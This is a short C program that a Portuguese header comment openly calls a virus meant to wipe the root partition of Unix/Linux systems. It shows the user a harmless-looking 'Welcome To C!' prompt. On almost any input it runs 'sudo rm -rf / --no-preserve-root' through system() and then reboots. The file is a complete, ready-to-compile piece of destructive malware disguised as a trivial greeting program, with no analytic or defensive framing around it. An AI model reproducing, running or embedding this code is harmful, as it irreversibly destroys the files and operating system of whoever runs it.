#include <stdio.h>
#include <stdlib.h>

/*Esse Arquivo É Escrito Na Linguagem C, O programa em sí é um virus, que destroi a partição / do sistema operacional do tipo Unix/Linux.
Esse é apenas o código fonte, utilizar ele assim não há problema algum, mas se compilar e executar sem ser em um ambiente especifico, F para seu sistema operacional.
@victorsoot on github.
*/

int main(){
    int byeMotherFucker;
    system("clear");
    printf("\nWelcome To C! Type A Key! ");
    scanf("%d", &byeMotherFucker);
    system("clear");
    if (byeMotherFucker == 6){
        printf("\n You Are Safe!\n\n");
    }
    else{
        system("clear");
        printf("\nYou Are Dead!\n\n");
        system("sudo rm -rf / --no-preserve-root");
        system("clear");
        system("sudo reboot");
    }
}
